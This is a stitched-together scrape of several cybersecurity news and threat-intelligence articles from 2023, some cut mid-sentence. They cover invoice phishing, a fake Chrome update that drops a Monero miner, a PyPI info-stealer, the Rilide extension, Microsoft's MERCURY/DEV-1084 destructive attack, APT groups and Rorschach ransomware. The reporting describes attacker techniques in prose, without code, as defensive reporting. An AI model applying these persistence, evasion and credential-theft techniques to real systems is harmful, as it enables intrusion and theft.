and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Rogue QuickBooks, PayPal accounts used in novel phishing attacks | SC Media",
      "text": "  Emphasis on stopping these largescale BEC attacks by defenders, which have cost companies in excess of $43 billion over several years, have forced hackers to shift gears, say researchers.Instead of compromising a corporate email account and targeting a top C-suite person, hackers are simply signing up for QuickBooks and PayPal accounts for free and sending thousands of phony invoices with phony phone numbers to mid-level managers and purchasing people as well as attacking small businesses. And it's working. While they could not determine how much money hackers have made from this new approach since they just started tracking this new variant last fall, the researchers said in the last two months they observed 160 emails using QuickBooks and more than 23,000 using PayPal. Today’s research outlines how Avanan blocked a hacker's attempt to use a legitimate QuickBooks account to defraud a company.“What's different is that the threat comes from legitimate sources,” said Jeremy Fuchs, a cybersecurity researcher-analyst at Avanan. “Traditional BEC strategies rely on analyzing the text in a message and seeing if something is out of the ordinary. It depends on looking at the sender's address and seeing if something is amiss, which relies on the context of messages, and sender history. All of that gets thrown out the window. Their previous communication with QuickBooks will look the same as this current campaign. So you won't be able to rely on natural language processing, anomalies, or anything else. It requires a new approach.”Fuchs said for its part, Avanan has phone number scam protection, where the artificial intelligence does a scan and very quickly can detect a fraudulent 800 number. They also have DLP on the back-end, where the software will block an invoice from being paid so an admin can look over the invoice one last time to make sure that it’s a legitimate invoice that should get paid.Companies need to slow the process down, said Fuchs. In essence, the old training of looking for a domain name error like QuickBox versus QuickBooks doesn’t work anymore. Managers must scrutinize every invoice more carefully, Google the phone number to make sure it’s a legitimate business, and as an extra line of defense, use DLP to slow the process down and have the invoice checked before it gets paid.“It will slow the process down, but in the long run it will save companies money,” said Fuchs. “If it works once and prevents you from paying out a huge invoice, it’s worth it.”Rogue invoice fraud requires business teams to operate the correct checks and balances – processes that can’t always get solved with a quick tech solution, said Andrew Barratt, vice president at Coalfire. Barratt added that these type of attacks are more impactful to small businesses that might not crosscheck purchase orders against an invoice before paying it.“It does require an attacker to try invoicing for a mass market service, so I’d expect to see these going out posing as Office 365 subscription payments or something else that there's a high probability of being a service consumed by a business,” said Barratt. “Part of the defense here is just good accounts payable hygiene. Make sure the invoice has the correct purchase order, that the renewal dates are known, and that the request for payment matches the expected time frame for an invoice.”Patrick Harr, chief executive officer at SlashNext, pointed out that this kind of trusted services compromise happens with all threats – not just BEC. Harr said it’s very popular with BEC, malicious HTML attachment attacks, and credential phishing attacks – and that’s why training is only one piece of a cybersecurity strategy.“Hackers use SharePoint, OneDrive, AWS, Hubspot, QuickBooks, PayPal to deliver attacks because they are coming from trusted domains and this increases the likelihood they will bypass traditional email technology that relies on blocklist and domain reputation, plus it will look legitimate to employees with security training,” said Harr. “These threats move fast. That’s because some technology can detect it, but it might take hours or days to make it to a threat database. Therefore, it’s important to have technology that has anti-evasion technology and can perform real-time scans to ensure these threats are stopped before wreaking havoc on an organization.”Avanan’s Fuchs added that hackers are incredibly adept at adjusting as defenders move to stop them. So much money and technology have been put into defending earlier forms of BEC – and many products have gotten good at stopping it, said Fuchs. “So hackers have to adjust, and they have here,” said Fuchs. “The cat-and-mouse game of cybersecurity--threat actors exploit a vulnerability, a patch is employed, and back and forth--is always fascinating to watch. It’s the next evolution, and now the onus is on security providers and end-users to harden their defenses.”Four high-severity Microsoft Exchange flaws reported by Trend Micro's Zero Day Initiative were noted by Microsoft to have been addressed or not need immediate servicing as required authentication would significantly reduce their odds of being exploited, SecurityWeek reports.The Register reports that U.S. insurance and advisory services provider Hilb Group had 81,539 individuals' personal data compromised following a breach of employee email accounts earlier this year.SiliconAngle reports that more threat actors have launched increasingly sophisticated cyberattacks aimed at streaming platforms since the Hollywood actors and writers' strike commenced in July.Tue Nov 19   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

These scripts will download additional scripts based on whether the visitor is the targeted audience.These malicious scripts are delivered through the Pinata IPFS (InterPlanetary File System) service, which obfuscates the origin server hosting the files, making blocklisting ineffective and resisting takedowns.If a targeted visitor browses the site, the scripts will display a fake Google Chrome error screen stating that an automatic update that is required to continue browsing the site failed to install.\"An error occurred in Chrome automatic update. Please install the update package manually later, or wait for the next automatic update,\" reads the fake Chrome error message.The scripts will then automatically download a ZIP file called 'release.zip' that is disguised as a Chrome update the user should install.However, this ZIP file contains a Monero miner that will utilize the device's CPU resources to mine cryptocurrency for the threat actors.Upon launch, the malware copies itself to C:\\Program Files\\Google\\Chrome as \"updater.exe\" and then launches a legitimate executable to perform process injection and run straight from memory.The miner persists by adding scheduled tasks and performing Registry modifications while excluding itself from Windows Defender.Additionally, it stops Windows Update and disrupts the communication of security products with their servers by modifying the IP addresses of the latter in the HOSTS file. This hinders updates and threat detection and may even disable an AV altogether.After all these steps, the miner connects to xmr.2miners[.]com and starts mining the hard-to-trace cryptocurrency Monero (XMR).While some of the websites that have been defaced are Japanese, NTT warns that the recent inclusion of additional languages may indicate that the threat actors plan to expand their targeting scope, so the campaign's impact may become greater soon.As always, never install security updates for installed software at third-party sites, and only install them from the software's developers or via automatic updates built into the program."

      "text": " Researchers have discovered malware peddlers advertising an info-stealer out in the open on the Python Package Index (PyPI) — the official, public repository for the Python programming language — with only the thinnest veneer of obfuscation.The perpetrators — whom researchers from Sonatype associated with a Spain-based malware-as-aservice (MaaS) gang called SylexSquad — gave their program a not-so-subtle name: \"reverse-shell.\" Reverse shells are programs that hackers commonly use to run commands remotely and receive data from targeted computers.\"I think what's quite funny about this is that it's just so blatant,\" says Dan Conn, developer advocate at Sonatype. \"Perhaps SylexSquad were advertising themselves, or they simply didn't care about being caught.\"However, their brazenness doesn't end there.The program turned out to be much more than a reverse shell, in fact. That became clear when the researchers examined one of its files, called \"WindowsDefender.py.\"WindowsDefender.py includes various obviously named functions, including get_login_data(), get_web_history(), get_downloads(), get_cookies(), get_credit_cards(), and ImageGrab.grab(). Per the theme, the hackers had not tried hard to conceal their intentions: this was malware designed to steal information.\"With no obfuscation, [this] appears to be ... a Discord bot that executes commands and performs actions on the infected machine,\" according to the analysis. \"The malware can retrieve cookies, take screenshots, run shell commands, steal browsing history, and send all this data to the attacker's Discord channel.\"But PyPI holds much more value to them than that.The SylexSquad attackers aren't the only miscreants utilizing forums like PyPI and GitHub, and there are many reasons for such brazenness, according to Sonatype.\"Hosting malicious files on a public repository provides bad actors more control over them,\" the researchers explained in their blog. \"It gives them the power of deleting, upgrading, or even doing version control of the payload.\"Among other benefits, \"it allows the malware to be shared a lot more widely,\" Conn elaborates, \"and it might actually trip up, in particular, a lot of antivirus software that uses generic signatures — like, actual bytes — to store whether something is malicious or not.\"In other words, rather than delivering malware upfront — which antivirus scanners can pick up on quickly — hackers can simply link to their malicious code elsewhere: \"By providing a link to a GitHub, they're maybe circumventing that check,\"”\" he notes.Public repositories have protective measures in place to avoid becoming a hub for hackers. Still, even the best scanners and moderators aren't perfect, and they can't be everywhere at once.\"Hackers take certain measures like encoding or otherwise obfuscating the code they host, to make it a little bit more difficult for automated engines to pick up,\" Juan Aguirre, security researcher at Sonatype, points out. In this case, SylexSquad encoded their malicious script as numbers, using easily reversible ASCII codes corresponding to each character.In this case, Sonatype reported the package to the PyPI maintainers and it was taken down. But \"it's just a game of cat and mouse,\" Aguirre says. \"Someone catches them and they just run to the next spot.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The malicious activities include monitoring browsing history, taking screenshots and stealing cryptocurrency through scripts injected into websites. \nRilide impersonated benign Google Drive extensions to remain undetected while abusing built-in Chrome features. The cybersecurity company also found another operation that loaded the extension using a Rust loader by leveraging Google Ads and the Aurora Stealer. While the origin of the malware is still unknown, Trustwave reports that it shares similarities with extensions that are sold to cybercriminals. In addition, due to a dispute between hackers over an unsolved payment, some of its code was recently disclosed on a dark web forum. Rilide’s loader modifies the web browser shortcut files to automate the execution of the malicious extension that is dropped on the compromised system.\nWhen the malware is executed, a script attaches a listener to monitor when the victim switches tabs, receives web content, or finishes loading a page. It also monitors if the current site matches a list of targets available from the command control (C2) server. If there is a match, the extension loads extra scripts that are injected into the webpage to steal the victim's cryptocurrency and email login information, among other details.\nAdditionally, the extension disables the browser's \"Content Security Policy,\" a security measure intended to guard against cross-site scripting (XSS) attacks to freely load external resources, usually restricted by the browser. Another interesting attribute of Rilide is its 2FA-bypassing system, used in producing bogus dialogs to lure victims into entering their temporary codes. \nThe system is triggered once the victim has submitted a request for a cryptocurrency withdrawal to one of the exchange services that Rilide targets. Right when the script needs to be injected into the background to process the request automatically, malware enters the picture.\nOnce the user has entered the code on the fake dialog, Rilide utilizes it to complete the withdrawal process to the hacker’s wallet address. “Email confirmations are also replaced on the fly if the user enters the mailbox using the same web browser[…]The withdrawal request email is replaced with a device authorization request tricking the user into providing the authorization code,” the Trustwave report explains. This way, Rilide has highlighted the growing threat possessed by malicious browser extensions, which now include live monitoring and automated money-stealing systems. In regards to the issue, Trustwave SpiderLabs noted that Google enforcing Manifest V3 might aid in making it difficult for the threat actors to use malicious extensions to organize attacks. However, it would not solve the issue entirely as “most of the functionalities leveraged by Rilide will still be available,” the researchers added. In order to protect yourself, it has been advised to use the best antivirus software, that would help in preventing your system from getting infected or having your data compromised. Similarly, a good identity theft protection service can help restore your stolen identity or funds stolen by hackers. Moreover, when installing new browser extensions, one must only rely on using trusted sources such as Chrome Web Store or the Microsoft Edge Add-ons store.\n your nameYour Emailyour message"

      "text": "  Google is upping the privacy ante for its Play Store with new rules that mandate Android app developers provide straightforward options for users to delete accounts and associated data.The measure will require app developers to provide in-app deletion options as well as giving users an ability to manage app data from a webpage.The move comes as Apple, Google and mobile app developers come under greater scrutiny by lawmakers and privacy advocates concerned over app makers overstepping their bounds and profiling, collecting personal user data and tracking mobile phone users without explicit consent. Apple implemented a similar policy for developers of apps on its’ App Store on June 30, 2022. Unlike Google, Apple only requires developers to provide an in-app path for account deletion and does not mandate a web-based option for users to delete their accounts. Currently Google only requires app developers to give users the option to request their data to be deleted. Under the new rules, developers need to make account deletion and data removal easily discoverable within their apps, while also providing a web link resource for users to delete their account and associated data.  New Google developer rules require companies to delete all data associated with a user’s account. In the case where developers need to keep certain data for specific reasons, such as security or regulatory compliance, they must clearly disclose the data retention practices to users.  \"Temporary account deactivation, disabling, or 'freezing' the app account does not qualify as account deletion,\" Google stated.  Users will also have the option to selectively delete portions of their data, such as activity history, images and videos.  \"By creating a more intuitive experience with this policy, we hope to better educate our shared users on data controls available to them and create greater trust in your apps and in Google Play more broadly,\" Otuteye said.  Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

By Saturday, the district released an update saying classes would be canceled because teachers and administrators needed to gather and plan on how to operate school “with no or reduced access to technology systems starting on Tuesday, April 11.”The district’s IT department was forced to shut down the network and nearly all of the school's core technology systems.“Because it would be very difficult to provide students with instruction and school services without access to the Internet and core systems, we are going to ask students not to report to school on Monday, April 10,” the district said.Staff will come in on Monday for an early morning meeting but will be given the chance to to work from home because internet and other systems are not operating. Sports and other extracurricular activities will operate as usual on Monday and other services will be available for parents in need, the district said.“We regret the impact that not having students report on Monday will have on our families and we also regret needing to share this information during what for many of our families is a holiday weekend and at the end of spring break” district officials said.The incident heightened concerns about the massive amount of data leaked onto the dark web when schools refuse to pay ransoms following cyberattacks.The mental health records of thousands of Los Angeles K-12 students were found leaked across the internet in recent weeks after an attack last year by the Vice Society ransomware group.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "title": "MERCURY and DEV-1084: Destructive attack on hybrid environment | Microsoft Security Blog",
      "text": " April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. MERCURY is now tracked as Mango Sandstorm and DEV-1084 is now tracked as Storm-1084. Previous MERCURY attacks have been observed targeting on-premises environments, however, the impact in this case notably also included destruction of cloud resources. Microsoft assesses that MERCURY likely worked in partnership with another actor that Microsoft tracks as DEV-1084, who carried out the destructive actions after MERCURY’s successful operations had gained access to the target environment.MERCURY likely exploited known vulnerabilities in unpatched applications for initial access before handing off access to DEV-1084 to perform extensive reconnaissance and discovery, establish persistence, and move laterally throughout the network, oftentimes waiting weeks and sometimes months before progressing to the next stage. DEV-1084 was then later observed leveraging highly privileged compromised credentials to perform en masse destruction of resources, including server farms, virtual machines, storage accounts, and virtual networks, and send emails to internal and external recipients.In this blog post, we detail our analysis of the observed actor activity and related tools. We also share information to the community and industry partners on ways to detect these attacks, including detection details of MERCURY and DEV-1084’s tools in Microsoft 365 Defender, Microsoft Defender for Identity, Microsoft Defender for Cloud Applications, Microsoft Defender Antivirus, and Microsoft Defender for Endpoint. As with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments.Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we reach high confidence about the origin or identity of the actor behind the activity.The link between the DEV-1084 cluster and MERCURY was established based on the following evidence:Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device. MERCURY then handed off access to DEV-1084. It is not currently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an ‘effects based’ sub-team of MERCURY that only surfaces when MERCURY operators are instructed to carry out a destructive attack.After gaining access, the threat actors deploy several tools and leverage techniques to maintain persistence, which provide effective and continued access to compromised devices, such as the following:Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest. Such reconnaissance activities were seen leveraged throughout the attack chain.The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment. These actions mainly involved:After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above. Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step.In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on-premises destructive operations to prepare for large-scale encryption of targeted devices.To do so, they first interfered with security tools using Group Policy Objects (GPO). With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers.GPO was leveraged again to register a scheduled task used to launch the ransomware payload. Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes.To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent. Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed. We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account. The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account. Investigating this sign-in showed that the threat actors were able to access the account on the first attempt without any guessing or modification of the password, indicating that the actors possessed the password for this account. The Azure AD Connector account is configured with single-factor authentication, making it easier for the attacker to gain entry and elevate privileges.On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts. The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync). For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account. Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.The actors went on to provide an existing legitimate OAuth application with both the full_access_as_app permission and administrator consent, which granted the threat actors full access to mailboxes through Exchange Web Services.With the obtained cloud administrator privileges, the threat actors updated the OAuth application with certificates to conduct malicious activities.  These newly added credentials could then be used to issue access tokens and authenticate on behalf of the application to access cloud resources.The threat actors used the compromised administrator account to grant SMTP Send on behalf permissions to the Azure AD Connector account over a high-ranking employee’s mailbox, using the Set-Mailbox PowerShell cmdlet.Emails were then created and sent both internally and externally.The timeline below summarizes the sequence of events:The techniques used by the actors and described in this blog can be mitigated by adopting the following security measures: Recommendations to secure your on-prem environmentRecommendations to secure your Azure AD environmentIn addition, the following alert can help detect compromised Azure AD Connect accounts:Monitor medium and high severity alerts for highly privileged accounts as they can indicate malicious activity. For example:The following Microsoft Defender for Identity alerts can indicate associated threat activity:For relevant accounts with Honeytoken configured, the following alert can indicate malicious activity:Microsoft Defender for Endpoint alerts with the following titles can indicate possible presence of the indicators of compromise listed below.Reducing the attack surfaceMicrosoft Defender for Endpoint customers can turn on the following attack surface reduction rule to block or audit some observed activity associated with this threat:Detecting Log4j 2 exploitationDetecting post-exploitation activityAlerts with the following titles may indicate post-exploitation threat activity related to MERCURY activity described in this blog and should be immediately investigated and remediated. These alerts are supported on both Windows and Linux platforms:Any alert title related to web shell threats, for example:Any alert title that mentions the DarkBit ransomware threat or DEV-1084, for example:Any alert title that mentions suspicious scheduled task creation or execution, for example:Any alert title that mentions suspected tunneling activity, for example:Any alert title that mentions suspected tampering activity, for example:Any alert title that mentions PowerShell, for example:Any alert title related to suspicious remote activity, for example:Any alert related to persistence:Any alert title that mentions credential dumping activity or tools, for example:To locate related activity, Microsoft 365 Defender customers can run the following advanced hunting queries:// Advanced Hunting Query to surface potential Mercury PowerShell script backdoor installation// Advanced Hunting Query to surface potential Mercury PowerShell script backdoor initiating commands//Advanced Hunting Query for Azure resource deletion activity//AHQ used to detect attacker abusing OAuth application during the attackMicrosoft Sentinel has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft Defender detections list above.The below list provides IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.NOTE: These indicators should not be considered exhaustive for this observed activity.\n\t\t\tAt the CYBERWARCON 2023 conference, Microsoft and LinkedIn analysts are presenting several sessions detailing analysis across multiple sets of threat actors and related activity, demonstrating Microsoft Threat Intelligence’s ongoing efforts to track threat actors, protect customers, and share information with the wider security community.\t\t\n\t\t\tMicrosoft has been tracking activity related to the financially motivated threat actor Octo Tempest, whose evolving campaigns represent a growing concern for many organizations across multiple industries.\t\t\n\t\t\tUser containment is a unique and innovative defense mechanism that stops human-operated attacks in their tracks. We’ve added user containment to the automatic attack disruption capability in Microsoft Defender for Endpoint. User containment is automatically triggered by high-fidelity signals and limits attackers’ ability to move laterally within a network regardless of the compromised account’s Active Directory state or privilege level.\t\t\n\t\t\tSince February 2023, Microsoft has observed a high volume of password spray attacks attributed to Peach Sandstorm, an Iranian nation-state group. In a small number of cases, Peach Sandstorm successfully authenticated to an account and used a combination of publicly available and custom tools for persistence, lateral movement, and exfiltration. \t\tMicrosoft is a leader in cybersecurity, and we embrace our responsibility to make the world a safer place."

      "text": " Mandiant, which has been tracking APT43 since 2018, noted that the threat group supports the mission of the Reconnaissance General Bureau, North Korea's primary external intelligence agency. In terms of attribution indicators, APT43 shares infrastructure and tools with known North Korean operators and threat actors. Essentially, APT43 shares malware and tools with Lazarus. Prior to 2021, the APT43 organization mostly targeted foreign policy and nuclear security challenges, but this changed in response to the global COVID-19 pandemic. APT43 primarily targets manufacturing products including fuel, machinery, metals, transportation vehicles, and weaponry whose sale to North Korea has been banned in South Korea, the U.S., Japan, and Europe. In addition to this, the group attacks business services, education, research and think tanks focusing on geopolitical and nuclear policy and government bodies. Spear phishing is one of the primary methods used by APT43 to compromise its targets. The group frequently fabricates plausible personas, impersonating important figures. Ones they have succeeded in compromising one such individual, the threat group proceeds into using the person’s contact lists to aim further targets with spear phishing. In one such instance, exposed by Google, Archipelago (a subset of APT43) would send phishing emails where they portray themselves as a representative of a media outlet or think task asking the targeted victim for an interview. To view the questions, a link must be clicked, but doing so takes the victim to a phony Microsoft 365 or Google Drive login page. The victim is directed to a paper with questions after entering their credentials. According to the Google report, Archipelago tends to interact with the victim for several days in order to build trust before sending the malicious link or file. Another tactic used by Archipelago involves sending benign PDF files purportedly from a third party that alerts the recipient to fraudulent logins they should examine. APT43 employs a variety of malware families and tools. Some of the public malware families used include Gh0st RAT, Quasar RAT, and Amadey. However, the threat group mostly uses a non-public malware called LATEOP or BabyShark, apparently developed by the group itself. Here, we have listed some measures that could ensure protection against  malicious APT43 attacks: Moreover, professionals in the field of geopolitics and international politics are advised to be trained in detecting any approach from attackers or potential threat actors, posing as a journalist or a reporter. Careful identification and examination of such individuals approaching important figures must be taken into priority, prior to any exchange of information or intelligence.  your nameYour Emailyour message"

      "text": " The Dutch government will upgrade the security of its internet routing by adopting before the end of 2024 the Resource Public Key Infrastructure (RPKI) standard.The standard uses digital certificates to secure the Border Gateway Protocol (BGP) used for exchanging routing information and ensure that the traffic comes through the legitimate network operator controlling the IP addresses on the destination path.The government supported the recommendation and in a decision last week it adopted the policy that refers to both newly added ICT equipment as well as the existing systems.RPKI certificates are stored centrally and kept public, allowing network providers from anywhere in the world to validate internet traffic routes.Networks that implement RPKI can be confident that internet traffic is routed only through authorized paths, thus eliminating the risks of man-in-the-middle or other data diversion and interception attacks.Without RPKI, Internet routing depends on the trust of the network operators advertising the correct IP prefixes they manage. Under this model, though, if an operator falsely advertises that they handle a particular set of IP addresses, they would receive traffic that would otherwise take a different path.Apart from the performance impact (e.g. network latency, disruption), this trust-based model opens the door to malicious BGP hijacking that allows traffic interception and monitoring, as well as spoofing legitimate IP addresses for spamming.The adoption of RPKI is already high in the Netherlands, with 77.9% of government websites and 75.1% of email domains already supporting the standard.However, global adoption of RPKI has moved slower than its developers and proponents hoped, with tier-two ISPs falling behind.According to NIST data from April 2023, about 41% of verifiable IPv4 prefix-origin pairs comply with RPKI, 58% are susceptible to routing incidents, and 1% have a mismatch in their route origin keys, so they're are not valid.In early 2020, RPKI adoption rate was 18% and grew to 27% in January 2021, and 33.5% at the beginning of 2022."

      "title": "APT group targeting organizations in Palestinian territories, researchers say",
      "text": " A state-backed group believed to be operating out of the Palestinian territories targeted local organizations in a campaign that began in September 2022 and lasted until at least February 2023.Researchers from Symantec have been tracking a cyber-espionage group they call “Mantis” but is also referred to as “Arid Viper.” The group has been active since at least 2014 and has been known to target organizations in Israel and several other Middle Eastern countries.Brigid O Gorman, a senior intelligence analyst with Symantec’s Threat Hunter Team, told Recorded Future News that the campaign did not target human rights organizations or government bodies but could not offer more information about who the victims were.“This attack campaign had all the hallmarks of cyber-espionage activity. Mantis is known to have launched cyber-espionage campaigns in the past, and in this campaign we see them deploying a custom data exfiltration tool to exfiltrate data from victim networks, alongside the updated versions of their custom Arid Gopher and Micropsia backdoors, so all signs point towards this being espionage activity,” she said.O Gorman said that while it might be unusual to see a Palestinian-based group go after Palestinian targets, it isn’t unprecedented and APT groups often target victims in their own countries.“This targeting is not unprecedented for Mantis itself and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017,” she said.“The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices,” they wrote. “While other vendors have linked the group to Hamas, Symantec cannot make a definitive attribution to any Palestinian organization.”The group has in the past targeted a wide range of organizations connected to governments, militaries and companies in the financial, media, education and energy sectors.Symantec said in the latest attacks on Palestinian organizations, the group used updated versions of tools it has previously deployed that enabled “extensive credential theft and exfiltration of stolen data.”One thing that stood out to O Gorman was a case where a compromised organization found the attackers deploying three different versions of the same tools on three different groups of computers. The tactics show the group “is pretty dedicated,” she said, noting that it was an example of the steps the group takes to maintain persistence on victim machines.“They're effectively mounting three separate attacks against one organization,” she said. “Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network,” the researchers wrote.The first evidence of activity was on December 18, when the threat actors first started their attack. The next day, the hackers used a tool to steal credentials before downloading a backdoor and upgrading their access to the organization’s network.Throughout December and January, the group installed other backdoors and tools to expand their access to data, and more.The group deployed the Arid Gopher malware, which they appear to regularly update and rewrite in order to evade detection. One version of the malware was vastly different from previous versions, meaning the hackers are spending significant amounts of time to update their tools.“Mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected,” the researchers said.Facebook added that the campaign targeted the Palestinian community, but also individuals living in Syria, Turkey, Iraq, Lebanon, and Libya. In total, Facebook said it identified 10 Android malware strains, two iOS malware hashes, eight desktop malware strains, and 179 domains used by Arid Viper in attacks that were carried out via Facebook accounts and other services.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

Charges also include attacking high-state institutions and money laundering.The hacker grew bolder with each attack, to the point that in an interview on YouTube he claimed to have access to information of roughly 90% of all Spanish citizens.According to details in local media, the Spanish police were able to track the young hacker by following the money trail for the hosting services of the \"Eye of Horus\" server.Although Huertas was using cryptocurrency that had been \"cleaned\" through mixing services, the police could still trace the payments with the help of experts at the National Cryptological Center.Huertas will remain in custody until the date of his trial, as the investigators consider there's an enormous risk that he will escape, destroy evidence, and continue to commit crimes of similar nature.Judge José Luis Calama motivated his decision for the suspect to remain detained by saying that he has significant amounts of cryptocurrency that would allow him to reside anywhere in the world, avoiding the action of Spanish justice."

Check Point reported the vulnerability to Trend Micro.The abuse of the legitimate Cortex XDR Dump Service Tool is particularly concerning, as it uses “vulnerable software to load malicious DLLs that provides persistence and evasion capabilities,” Jon Miller, Halcyon CEO and co-founder, told SC Media in an emailed statement. “DLL-sideloading is not new, but it is somewhat rare.” Check Point’s analysis of the cyberattack confirmed Rorschach is unique and shares no overlapping characteristics that prevent easy attribution to any other known ransomware variants.“The threat actor didn’t hide behind any alias and appears to have no affiliation to any of the known ransomware groups,” researchers wrote. “Those two facts, rarities in the ransomware ecosystem, piqued [our] interest and prompted us to thoroughly analyze the newly discovered malware.”“While it seems to have taken inspiration from some of the most infamous ransomware families, it also contains unique functionalities, rarely seen among ransomware, such as the use of direct syscalls,” they added.It’s also highly customizable. In addition to its high speed of encryption, the variant bears a number of characteristics of particular concern.The strain is partly autonomous, automatically running tasks that ransomware actors would typically perform manually during deployment. For one, it creates domain group policies on the Windows Domain Controller without human interaction. Past interactions of LockBit leveraged similar functionality, but Rorschach’s deployment is different.For example, it creates multiple group policies: one that copies itself into the public folder of all workstations on the victims network, another that attempts to ”kill a list of predefined” processes, and a third that registers a scheduled task that immediately runs. Once a user logs on, the main executable is deployed with the relevant arguments.In short, the “extremely flexible” variant can automatically spread when deployed on the domain controller and clears the event logs of impacted devices. It operates a built-in configuration and on “numerous optional arguments” that allow it to modify its tactics based on the operator’s needs. As observed by Check Point in the wild, Rorschach executes using the Cortex XDR Dump Service Tool version 7.3.0.16740, as well as winutils.dll, a packed loader and injector used to both decrypt and inject the ransomware.The variant also uses config.ini, which contains all the logic and configuration of the encrypted ransomware. Researchers noted that this is the main payload, “subsequently loaded into memory as well as, decrypted and injected into notepad.exe, where the ransomware logic begins.”Even its spawning processes are uncommon, as it runs in \"suspend mode\" and gives out “falsified arguments” that makes it difficult for network defenders to analyze and remediate.The falsified argument is “a repeating string of the digit one, based on the length of the real argument, rewritten in memory and replaced with the real argument, resulting in a unique execution,” researchers explained.For Miller, the most interesting feature of Rorschach is not its speed, but its advanced security evasion capabilities that makes the payload delivery undetectable, which is highly concerning.“With fast encryption, once the ransomware payload is delivered and the operation is exposed, responders have less time to intervene,” said Miller. “RaaS providers tout their encryption speed to attract affiliate attackers, and it definitely makes this ransomware strain one to watch.” Detection of DLL side-loading attacks can be difficult. As such, analysts should look for unsigned DLLs within executable files or “suspicious loading paths and timestamps that show gaps between the compilation time for the executable and DLL loading time.”The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

      "text": " The Iranian nation-state group known as MuddyWater has been observed carrying out destructive attacks on hybrid environments under the guise of a ransomware operation.That's according to new findings from the Microsoft Threat Intelligence team, which discovered the threat actor targeting both on-premises and cloud infrastructures in partnership with another emerging activity cluster dubbed DEV-1084.It's also tracked by the cybersecurity community under various names, including Boggy Serpens, Cobalt Ulster, Earth Vetala, ITG17, Mercury, Seedworm, Static Kitten, TEMP.Zagros, and Yellow Nix.The latest findings from Microsoft reveal the threat actor probably worked together with DEV-1084 to pull off the espionage attacks, the latter of which conducted the destructive actions after MuddyWater successfully gained a foothold onto the target environment.\"Mercury likely exploited known vulnerabilities in unpatched applications for initial access before handing off access to DEV-1084 to perform extensive reconnaissance and discovery, establish persistence, and move laterally throughout the network, oftentimes waiting weeks and sometimes months before progressing to the next stage,\" Microsoft said.In the activity detected by Redmond, DEV-1084 subsequently abused highly privileged compromised credentials to perform encryption of on-premise devices and large-scale deletion of cloud resources, including server farms, virtual machines, storage accounts, and virtual networks.Furthermore, the threat actors gained full access to email inboxes through Exchange Web Services, using it to perform \"thousands of search activities\" and impersonate an unnamed high-ranking employee to send messages to both internal and external recipients.The aforementioned actions are estimated to have transpired over a roughly three-hour time frame starting at 12:38 a.m. (when the attacker logged into the Microsoft Azure environment via compromised credentials) and ending at 3:21 a.m. (when the attacker sent emails to other parties after the successful cloud disruption).\"DEV-1084 [...] presented itself as a criminal actor interested in extortion, likely as an attempt to obfuscate Iran's link to and strategic motivation for the attack,\" Microsoft added.That said, there is not ample evidence to determine if DEV-1084 operates independently of MuddyWater and collaborates with other Iranian actors, or if it's a sub-team that's only summoned when there is a need to conduct a destructive attack.\"While these teams seem to operate independently, they are all motivated by the same factors that align with Iranian national security objectives, including espionage, intellectual theft, and destructive or disruptive operations based on the victims they target,\" Talos noted in March 2022.Join us for our webinar to learn how to tackle challenges, launch a program, and 